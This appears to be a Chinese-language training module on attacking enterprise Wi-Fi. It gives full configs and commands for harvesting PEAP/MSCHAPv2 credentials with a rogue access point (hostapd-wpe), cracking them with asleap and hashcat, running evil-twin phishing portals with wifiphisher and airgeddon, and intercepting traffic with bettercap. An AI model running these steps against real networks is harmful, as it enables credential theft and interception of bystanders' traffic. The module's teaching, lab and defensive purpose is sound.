@@ -1,0 +1,647 @@
+================================================================================
+  模块06：企业无线攻击与Rogue AP
+  学习目标：掌握WPA2-Enterprise攻击、Rogue AP搭建和钓鱼WiFi技术
+  所需工具：hostapd-wpe, asleap, wifiphisher, airgeddon, airmon-ng, airbase-ng
+================================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第一部分：企业WiFi (WPA2-Enterprise) 攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1.1 WPA2-Enterprise vs WPA2-Personal
+
+  ┌──────────────┬───────────────────────┬────────────────────────┐
+  │ 特性         │ WPA2-Personal (PSK)   │ WPA2-Enterprise         │
+  ├──────────────┼───────────────────────┼────────────────────────┤
+  │ 认证方式     │ 预共享密钥             │ RADIUS + 802.1X        │
+  │ 密钥         │ 所有人同一PSK          │ 每人独立凭据           │
+  │ 适用场景     │ 家庭、小型办公         │ 企业、教育、政府       │
+  │ 攻击难度     │ 字典破解               │ 凭证窃取/中继          │
+  │ 攻击隐蔽性   │ 完全被动               │ 需要Rogue AP交互       │
+  │ 密码复杂度   │ 用户设置，可能弱       │ IT管理，通常较强        │
+  └──────────────┴───────────────────────┴────────────────────────┘
+
+1.2 802.1X/EAP认证体系
+
+  802.1X架构：Supplicant(客户端) <-> Authenticator(AP) <-> Authentication Server(RADIUS)
+
+  EAP方法类型：
+  ┌──────────────┬──────────────────────────────────────────────┐
+  │ EAP方法      │ 安全性                                       │
+  ├──────────────┼──────────────────────────────────────────────┤
+  │ EAP-MD5      │ 最弱，仅MD5挑战响应，可离线破解               │
+  │ LEAP         │ Cisco专用，已破解，ASLEAP工具可恢复密码        │
+  │ EAP-TLS      │ 最强，双向证书认证，需PKI                      │
+  │ PEAP         │ 服务器证书+内部MSCHAPv2，可被降级攻击          │
+  │ EAP-TTLS     │ 类似PEAP，可配置不同内部认证方式               │
+  │ EAP-FAST     │ Cisco PEAP替代，PAC文件保护                    │
+  │ EAP-GTC      │ 通用令牌卡，明文传输(需TLS隧道)               │
+  └──────────────┴──────────────────────────────────────────────┘
+
+1.3 PEAP/MSCHAPv2攻击原理
+
+  PEAP是最常见的企业WiFi部署方式：
+    1. 客户端连接到企业WiFi
+    2. TLS隧道建立(服务器证书认证)
+    3. MSCHAPv2在TLS内执行(用户名+密码认证)
+    4. 客户端不验证服务器证书 ← 弱点！
+
+  攻击原理：
+    1. 攻击者搭建Rogue AP，使用相同的SSID
+    2. 攻击者的AP发送自己的RADIUS服务器证书
+    3. 如果客户端不验证证书 → 连接
+    4. 攻击者在TLS隧道内获取MSCHAPv2凭证
+    5. 离线破解MSCHAPv2获取明文密码
+
+  MSCHAPv2破解难度：
+    - NT Hash被DES加密分3部分
+    - 每部分7字节 → 暴力可行
+    - hashcat/chapcrack可破解
+    - 依赖密码强度
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第二部分：hostapd-wpe —— 企业WiFi凭证收割
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+2.1 hostapd-wpe简介
+
+  hostapd-wpe是hostapd的修改版(WPE = Wireless Pwnage Edition)，
+  专门设计用于攻击WPA2-Enterprise网络。
+
+  核心功能：
+    - 搭建Rogue AP
+    - 自动收割EAP凭证
+    - 支持多种EAP类型
+    - 日志清晰简洁
+    - 集成asleap/crack攻击
+    - 支持karma攻击(响应所有Probe Request)
+
+2.2 基础配置
+
+  $ cat > /tmp/hostapd-wpe.conf << 'EOF'
+  interface=wlan1
+  ssid=CorporateWiFi
+  channel=6
+  hw_mode=g
+
+  # WPA2-Enterprise
+  wpa=2
+  wpa_key_mgmt=WPA-EAP
+  wpa_pairwise=CCMP
+
+  # EAP配置
+  eap_server=1
+  eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+  ca_cert=/etc/hostapd-wpe/certs/ca.pem
+  server_cert=/etc/hostapd-wpe/certs/server.pem
+  private_key=/etc/hostapd-wpe/certs/server.key
+
+  # 日志
+  logger_syslog=-1
+  logger_syslog_level=2
+  logger_stdout=-1
+  logger_stdout_level=2
+  EOF
+
+  启动：
+  $ sudo hostapd-wpe /tmp/hostapd-wpe.conf
+
+2.3 凭证收割日志分析
+
+  当有客户端连接时，日志输出：
+  ┌──────────────────────────────────────────────────────────────┐
+  │ hostapd-wpe: EAP Identified                                  │
+  │ hostapd-wpe: username: john.doe                              │
+  │ hostapd-wpe: EAP-MSCHAPv2                                   │
+  │ hostapd-wpe: username:       john.doe                        │
+  │ hostapd-wpe: challenge:      a1:b2:c3:d4:e5:f6:...           │
+  │ hostapd-wpe: response:       11:22:33:44:55:66:...           │
+  │ hostapd-wpe: jtr NETNTLM:    $NETNTLM$a1b2c3d4e5...          │
+  │ hostapd-wpe: hashcat NETNTLM: $NETNTLM$...                   │
+  └──────────────────────────────────────────────────────────────┘
+
+  关键数据：
+    - username  : 域用户名
+    - challenge : MSCHAPv2质询
+    - response  : MSCHAPv2响应(加密后的凭证)
+    - NE TNTLM  : 可用于John the Ripper破解
+    - hashcat   : 可用于hashcat破解
+
+2.4 破解收割的凭证
+
+  方法1：使用asleap
+  $ asleap -r capture.pcap -W wordlist.txt
+  $ asleap -C challenge -R response -W wordlist.txt
+
+  方法2：使用John the Ripper
+  $ john --wordlist=rockyou.txt hash.txt
+
+  方法3：使用hashcat
+  $ hashcat -m 5500 hash.txt rockyou.txt
+
+  方法4：使用chapcrack
+  $ chapcrack -i capture.pcap
+
+2.5 Karma攻击(带SSID响应)
+
+  配置hostapd-wpe响应所有Probe Request：
+  $ cat > /tmp/hostapd-wpe-karma.conf << 'EOF'
+  interface=wlan1
+  ssid=internet
+  channel=6
+  hw_mode=g
+  wpa=2
+  wpa_key_mgmt=WPA-EAP
+  wpa_pairwise=CCMP
+  eap_server=1
+  eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+  ca_cert=/etc/hostapd-wpe/certs/ca.pem
+  server_cert=/etc/hostapd-wpe/certs/server.pem
+  private_key=/etc/hostapd-wpe/certs/server.key
+
+  # Karma: 接受所有SSID的客户端探测
+  # hostapd-wpe 自动启用
+  EOF
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第三部分：asleap — LEAP/PPTP凭证破解
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+3.1 asleap简介
+
+  asleap专门针对Cisco LEAP协议和MS-CHAPv2的破解工具。
+
+  LEAP漏洞：
+    - LEAP使用MS-CHAPv2进行认证
+    - 挑战-响应机制公开
+    - 弱密码可被字典攻击破解
+    - NT Hash最后一字节总是0x00(7字节强制对齐)
+
+3.2 基本使用
+
+  从pcap文件提取并破解LEAP：
+  $ asleap -r capture.pcap -W rockyou.txt
+
+  从pcap读取所有LEAP挑战：
+  $ asleap -r capture.pcap (仅提取，不破解)
+
+  破解MS-CHAPv2：
+  $ asleap -C <challenge> -R <response> -W rockyou.txt
+
+  $ asleap -C a1b2c3d4e5f6g7h8 \
+           -R 11223344556677889900aabbccddeeff1122 \
+           -W rockyou.txt
+
+  高级Genkeys生成(预计算哈希)：
+  $ genkeys -r capture.pcap -f rockyou.txt -s SSID
+  $ asleap -r capture.pcap -f rockyou.txt -g genkeys.dat
+
+  导出为hashcat格式：
+  $ asleap -r capture.pcap -f rockyou.txt -G hash.txt
+  $ hashcat -m 5500 hash.txt rockyou.txt
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第四部分：wifiphisher — 钓鱼WiFi攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+4.1 wifiphisher原理
+
+  wifiphisher是WiFi社交工程攻击框架：
+
+  攻击流程：
+    1. 扫描周围WiFi网络
+    2. 选择目标网络
+    3. 发送Deauth强制客户端断开
+    4. 启动伪造AP(同SSID，无密码)
+    5. 客户端(用户)发现WiFi断开 → 看到同名开放网络
+    6. 用户手动连接后 → 弹出钓鱼页面
+    7. 钓鱼页面要求输入WiFi密码(仿路由器固件升级/固件更新)
+    8. 输入后显示正在连接，实际密码已记录
+    9. 攻击者获得密码，停止了Rogue AP
+
+4.2 wifiphisher基本使用
+
+  $ sudo wifiphisher
+
+  交互流程:
+    1. 选择无线接口
+    2. 选择攻击模式：
+       - Network Manager (仿路由器管理)
+       - Firmware Update (仿固件升级)
+       - User Manual (仿用户手册)
+       - OAuth Login (仿社交登录)
+       - Browser Plugin (仿浏览器插件)
+    3. 选择目标WiFi网络(从扫描列表)
+    4. 自动启动攻击
+
+4.3 高级参数
+
+  指定接口和ESSID:
+  $ sudo wifiphisher -i wlan0 -e TargetWiFi
+
+  指定钓鱼场景:
+  $ sudo wifiphisher -p firmware-upgrade
+
+  跳过接口选择:
+  $ sudo wifiphisher --nointerfacecheck
+
+  自动模式(跳过交互):
+  $ sudo wifiphisher --essid TargetWiFi -p firmware-upgrade \
+    -aI wlan0 -jI wlan1
+
+  参数详解:
+    -i <iface>    : 无线接口(用于Rogue AP)
+    -e <ESSID>    : 目标网络名
+    -p <scenario> : 钓鱼场景
+    -jI <iface>   : 干扰接口(用于Deauth)
+    -aI <iface>   : AP接口
+    -l <logdir>   : 日志目录
+
+4.4 自定义钓鱼页面
+
+  wifiphisher支持自定义HTML/CSS/JS:
+  $ sudo wifiphisher -p /path/to/custom_scenario/
+
+  自定义场景结构:
+  custom_scenario/
+    |- config.ini         (配置文件)
+    |- templates/
+    |   |- login.html     (登录页面)
+    |   |- success.html   (成功页面)
+    |- web_server.py      (Web后端，可选)
+
+4.5 wifiphisher的Ethical考量
+
+  - wifiphisher的钓鱼页面刻意模仿真实界面
+  - 这是高度侵入性的攻击(社交工程)
+  - 仅限在明确授权且有监督的渗透测试中使用
+  - 公司内部安全测试需要HR/法务书面批准
+  - 钓鱼测试可能影响员工信任度
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第五部分：airgeddon — 综合无线攻击框架
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+5.1 airgeddon简介
+
+  airgeddon是Bash编写的多用途无线安全审计框架，整合了大量工具。
+
+  支持的攻击方式:
+    - WPA/WPA2握手捕获和破解
+    - WPS PIN攻击 (reaver + bully集成)
+    - PMKID攻击 (hcxdumptool集成)
+    - Evil Twin攻击 (Rogue AP)
+    - DoS攻击 (Deauth/Disassociation)
+    - 企业WiFi攻击
+    - 在线hash破解API集成
+
+5.2 启动和配置
+
+  $ sudo airgeddon
+
+  首次启动：
+    - 选择语言
+    - 检查依赖工具
+    - 自动安装缺失的工具
+    - 选择无线接口
+
+  主菜单导航:
+  ┌──────────────────────────────────────────────────────────────┐
+  │ 1. Interface selection: wlan0                               │
+  │ 2. Monitor mode: enable                                     │
+  │ 3. Scan networks                                            │
+  │ 4. Select target                                            │
+  │ 5. Attack types:                                            │
+  │    5.1  Handshake capture + crack                           │
+  │    5.2  PMKID capture + crack                               │
+  │    5.3  Evil Twin attack (captive portal)                   │
+  │    5.4  WPS PIN attack                                      │
+  │    5.5  Enterprise attack                                   │
+  │    5.6  DoS attack                                          │
+  │ 6. Options and settings                                      │
+  └──────────────────────────────────────────────────────────────┘
+
+5.3 Evil Twin攻击流程(airgeddon版)
+
+  菜单路径: 5 -> 5.3 (Evil Twin)
+
+  步骤：
+    1. airgeddon扫描目标AP
+    2. 记录目标BSSID、信道、加密方式
+    3. 发送Deauth使客户端断开
+    4. 启动Rogue AP(相同SSID，开放网络)
+    5. 启动DHCP/DNS服务器(dnsmasq)
+    6. 启动Captive Portal(钓鱼登录页)
+    7. 当受害者连接后，自动跳转到钓鱼页
+    8. 收割密码 → 记录到日志
+    9. 显示密码后关闭Rogue AP
+
+  支持的Captive Portal模板：
+    - 路由器管理页面
+    - 运营商登录页
+    - Google/Facebook OAuth
+    - 自定义模板
+
+5.4 airgeddon高级功能
+
+  多接口支持:
+    一个接口做Rogue AP，另一个做Deauth:
+    $ sudo airgeddon
+    主菜单选择接口后启用多接口模式
+
+  插件系统:
+    ~/.airgeddon/plugins/
+    可自定义插件扩展功能
+
+  线上破解集成:
+    支持Boonana、CrackStation等在线破解API
+    自动提交hash在线查询
+
+  监控模式:
+    实时监控客户端连接状态
+    自动检测WPS锁定状态
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第六部分：Rogue AP高级搭建(手动)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+6.1 完整Rogue AP手动搭建(无DHCP服务器)
+
+  仅搭建AP，不提供网络：
+
+  Step 1: 创建hostapd配置
+  $ cat > /tmp/rogue_ap.conf << 'EOF'
+  interface=wlan1
+  driver=nl80211
+  ssid=FreeWiFi
+  hw_mode=g
+  channel=6
+  # 开放无加密
+  EOF
+
+  Step 2: 启动AP
+  $ sudo hostapd /tmp/rogue_ap.conf
+
+6.2 完整Rogue AP+DHCP+DNS(完整钓鱼链路)
+
+  Step 1: 配置网络接口
+  $ sudo ip addr add 10.0.0.1/24 dev wlan1
+  $ sudo ip link set wlan1 up
+
+  Step 2: 创建dnsmasq配置
+  $ cat > /tmp/dnsmasq.conf << 'EOF'
+  interface=wlan1
+  dhcp-range=10.0.0.10,10.0.0.100,12h
+  dhcp-option=3,10.0.0.1
+  dhcp-option=6,10.0.0.1
+  address=/#/10.0.0.1
+  server=8.8.8.8
+  EOF
+
+  Step 3: 启动dnsmasq
+  $ sudo dnsmasq -C /tmp/dnsmasq.conf -d
+
+  Step 4: 启动hostapd
+  $ sudo hostapd /tmp/rogue_ap.conf
+
+  Step 5: 允许IP转发和NAT(如果给受害者联网)
+  $ sudo sysctl net.ipv4.ip_forward=1
+  $ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+  $ sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
+  $ sudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
+
+  Step 6: 启动Web服务器(钓鱼页面)
+  $ sudo python3 -m http.server 80
+  (在 /tmp/phishing_page/ 目录下准备index.html)
+
+6.3 airbase-ng搭建Rogue AP
+
+  airbase-ng是aircrack-ng套件中的Rogue AP工具：
+
+  $ sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+
+  参数：
+    -e "SSID"    : AP名称
+    -c 6         : 信道
+    -a <MAC>     : 设置BSSID
+    -P           : 响应所有Probe Request(Karma模式)
+    -C 30        : 信标发送间隔(毫秒)
+    -v           : 详细输出
+
+  创建虚拟接口后配置：
+  生成 at0 虚拟接口
+  $ sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
+  $ sudo dnsmasq -i at0 --dhcp-range=10.0.0.10,10.0.0.100
+
+  Karma模式(-P)特别强大：
+  对所有Probe Request都会回复Probe Response，
+  客户端的设备上会显示攻击者的AP。
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第七部分：综合实践
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+实践目标：掌握Rogue AP攻击和企业WiFi凭证收割
+
+══════════════════════════════════════════════════════════════════
+  实践 6-1：hostapd-wpe搭建Rogue企业AP
+══════════════════════════════════════════════════════════════════
+
+Step 1: 安装hostapd-wpe
+  在Arch Linux/ArchStrike:
+  $ sudo pacman -S hostapd-wpe
+
+Step 2: 生成证书
+  $ cd /etc/hostapd-wpe/certs
+  $ sudo ./bootstrap
+
+Step 3: 创建配置文件
+  使用第二部分2.2的配置模板
+
+Step 4: 启动Rogue企业AP
+  $ sudo hostapd-wpe /tmp/hostapd-wpe.conf
+
+Step 5: 使用另一台设备连接
+  - 在测试设备上选择 "CorporateWiFi"
+  - 输入任意用户名密码(如 test/test123)
+
+Step 6: 观察日志
+  终端输出应显示：
+    username: test
+    challenge: ...
+    response: ...
+
+Step 7: 提取凭证并尝试破解
+  $ asleap -C <challenge> -R <response> -W rockyou.txt
+  或在hostapd-wpe输出中复制JTR/hashcat格式
+
+══════════════════════════════════════════════════════════════════
+  实践 6-2：wifiphisher钓鱼攻击
+══════════════════════════════════════════════════════════════════
+
+Step 1: 准备环境
+  终端1: sudo airmon-ng start wlan0
+  (进入监听模式用于Deauth)
+
+Step 2: 启动wifiphisher
+  终端输入：sudo wifiphisher
+
+Step 3: 选择Rogue AP接口
+  选择用于搭建Rogue AP的无线接口
+
+Step 4: 选择钓鱼场景
+  建议选择 "Firmware Update" 场景
+
+Step 5: 选择目标WiFi
+  从扫描列表中选择你的测试AP
+
+Step 6: 观察攻击流程
+  - 自动对目标客户端发送Deauth
+  - 启动伪造AP(相同SSID，开放网络)
+  - Web服务器启动(钓鱼页面)
+
+Step 7: 测试受害者体验
+  用测试设备：
+  - 原WiFi断开
+  - 看到同名开放WiFi
+  - 连接后弹出固件升级页面
+  - 要求输入WiFi密码
+
+Step 8: 查看收割结果
+  wifiphisher终端显示捕获的密码
+
+Step 9: 停止攻击
+  Ctrl+C，wifiphisher自动清理
+
+══════════════════════════════════════════════════════════════════
+  实践 6-3：airgeddon Evil Twin完整实践
+══════════════════════════════════════════════════════════════════
+
+Step 1: 启动airgeddon
+  终端输入：sudo airgeddon
+
+Step 2: 接口配置
+  选择无线接口 → 启用监听模式
+
+Step 3: 扫描网络
+  主菜单 → Scan networks
+  等待扫描完成
+
+Step 4: 选择目标
+  从目标列表中选择测试AP
+
+Step 5: 启动Evil Twin攻击
+  Attack menu → Evil Twin attack
+  选择 Captive Portal 类型
+
+Step 6: 配置Captive Portal
+  选择模板(路由器管理/固件升级)
+
+Step 7: 等待受害者连接
+  观察终端状态：Deauth发送、Rogue AP状态、连接事件
+
+Step 8: 收割凭证
+  当有人输入密码后：
+  终端显示密码明文
+  自动保存到日志文件
+
+Step 9: 停止并清理
+  菜单选择停止
+  airgeddon自动恢复网卡
+
+══════════════════════════════════════════════════════════════════
+  实践 6-4：手动Rogue AP + 流量劫持(进阶)
+══════════════════════════════════════════════════════════════════
+
+Step 1: 创建完整Rogue AP环境
+  使用第六部分6.2的完整步骤
+  (hostapd + dnsmasq + iptables)
+
+Step 2: 验证工作
+  用手机连接Rogue AP:
+  - 应能获取IP(10.0.0.x)
+  - DNS应全部解析到10.0.0.1
+
+Step 3: 使用bettercap进行中间人攻击
+  $ sudo bettercap -iface wlan1
+  (在Rogue AP接口上拦截流量)
+
+Step 4: 启动SSLstrip
+  bettercap中启用 http.proxy 和 https.proxy
+
+Step 5: 观察受害者流量
+  - HTTP请求明文可见
+  - HTTPS可能降级到HTTP
+
+Step 6: 记录和分析
+  所有流量记录在 bettercap 日志中
+
+══════════════════════════════════════════════════════════════════
+  实践 6-5：Karma攻击测试
+══════════════════════════════════════════════════════════════════
+
+Step 1: 使用airbase-ng Karma模式
+  $ sudo airbase-ng -P -C 30 -e "FreeWiFi" wlan0mon
+
+Step 2: 观察Probe Requests
+  - 手机自动发送Probe Request包含历史WiFi名单
+  - Karma模式对每个Probe Request都回复Probe Response
+  - 手机显示 "FreeWiFi" 为可用网络
+
+Step 3: 使用hostapd-wpe Karma
+  hostapd-wpe也支持Karma模式
+  配置: hs20=1
+
+Step 4: 理解Karma的影响范围
+  - 几乎所有手机/笔记本都受影响
+  - 自动WiFi连接设备最容易受害
+  - 物联网设备特别脆弱
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第八部分：注意事项
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WARNING 法律警告
+  - Rogue AP和钓鱼WiFi攻击涉及主动干扰无线通信
+  - 在中国，这类行为可能构成"破坏计算机信息系统"
+  - 未经授权搭建仿冒WiFi属严重违法行为
+  - 企业安全测试需要明确的法律授权和范围界定
+  - 钓鱼攻击涉及社交工程，需要额外的伦理考量
+
+WARNING 技术提醒
+  - Rogue AP需要两张网卡(一张监听/Deauth，一张发AP)
+  - 或一张网卡做时间分割(效率较低)
+  - DNS/DHCP配置错误可能导致受害者服务中断
+  - Evil Twin攻击后的清理至关重要(恢复网络)
+  - 企业WiFi环境中可能有WIDS检测Rogue AP
+
+WARNING 伦理提醒
+  - 钓鱼攻击是高度侵入性的
+  - 不应在未经同意的情况下测试真实用户
+  - 安全培训应强调防御而非攻击
+  - 理解这些技术是为了更好地防护自己的网络
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+课后练习
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. 搭建hostapd-wpe并尝试收割自己的测试凭证
+2. 对比wifiphisher和airgeddon的Evil Twin攻击流程
+3. 研究PEAP证书验证缺失的防御方法
+4. 使用Wireshark分析一次完整的EAP-MSCHAPv2认证流程
+5. 用asleap尝试破解MSCHAPv2凭证
+6. 手动搭建完整Rogue AP环境(hostapd + dnsmasq)
+7. 研究如何在企业网络中检测Rogue AP
+8. 了解802.11w (PMF)如何防御Deauth攻击
+
+================================================================================
+  模块06结束 — 企业无线攻击是最复杂的无线攻击形式之一
+================================================================================
